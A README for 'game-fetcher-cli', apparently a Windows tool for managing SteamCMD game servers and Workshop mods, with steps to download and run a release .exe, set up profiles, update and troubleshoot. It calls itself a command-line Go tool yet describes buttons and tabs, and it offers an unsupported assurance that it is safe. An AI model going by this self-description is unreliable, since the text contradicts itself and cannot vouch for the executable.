# 🎮 game-fetcher-cli - Manage game servers with simple profiles

[Download the latest release](https://github.com/Ettierevised51/game-fetcher-cli/releases)

## 📌 About this tool

Game-fetcher-cli helps you manage dedicated game servers and Workshop mods. It works as a tool that talks to Steam to get the files you need. You do not need API keys or complex setups to use it. The program tracks your server state and updates your files when needed.

## 💻 System requirements

Your computer needs these items to run the software:

*   Windows 10 or Windows 11
*   An active internet connection
*   Enough drive space for your game files
*   The SteamCMD tool (The program will guide you through this setup)

## 📥 How to download and install

1.  Visit the [official releases page](https://github.com/Ettierevised51/game-fetcher-cli/releases).
2.  Look for the latest version at the top of the list.
3.  Click the file ending in `.exe` to start the download.
4.  Move this file to a folder where you want your game servers to live.
5.  Double-click the file to start the program.

## ⚙️ Setting up your first server

The program uses profiles to store your settings. A profile contains the information about which game server to install and where to save the files.

1.  Open the program.
2.  Choose the option to create a new profile.
3.  Enter a name for your server.
4.  Input the Steam App ID for the game you want to host. You can find these IDs on the Steam database website.
5.  Wait for the program to detect your SteamCMD installation. If you lack this tool, the program will prompt you to download the official version from Steam.
6.  Save your profile settings.

## 🔄 Updating your server and mods

You can keep your server and mods current without manual effort.

1.  Open the program and select your server profile.
2.  Click the button labeled Update.
3.  The program compares your current files with the latest versions from Steam.
4.  It downloads only the files that changed. This saves time and bandwidth.
5.  Once the process finishes, your server is ready to launch.

## 📂 Managing workshop mods

Workshop mods increase the life of your games. This tool manages these mod files locally.

1.  Go to the Mods tab in the program.
2.  Add the collection ID or the specific mod IDs you want to include in your server.
3.  Save the changes.
4.  The next time you trigger an update, the program fetches these mods and places them in the correct game folder.

## 🛠 Troubleshooting common issues

Most issues stem from folder permissions or blocked network traffic.

*   **Denied Access:** If the program fails to write files, move the folder out of your Program Files directory. Place it in a folder directly under your C: drive, such as C:\Servers.
*   **Slow Connections:** Steam servers sometimes throttle speeds during peak hours. If a download stalls, wait a few minutes and try again.
*   **Startup Errors:** Verify that you have the latest version of the tool. Check your firewall settings to ensure the program has permission to reach the internet.

## 📋 Tips for better performance

*   Use a Solid State Drive (SSD) for your server files to improve load times during startup.
*   Check your server status before you share the address with friends.
*   Run the update command at least once a week to ensure your server follows the latest game patches.
*   Keep your server profile names short and clear to avoid confusion when you manage multiple games.

## 🛡 Security and safety

This tool does not collect your Steam credentials. It operates as a bridge between your computer and public game files. You do not need to share passwords or personal account information. All data files remain on your computer.

Keywords: cli, dedicated-server, game-server, go, golang, server-management, steam, steam-games, steam-worshop, steamcmd, workshop-mods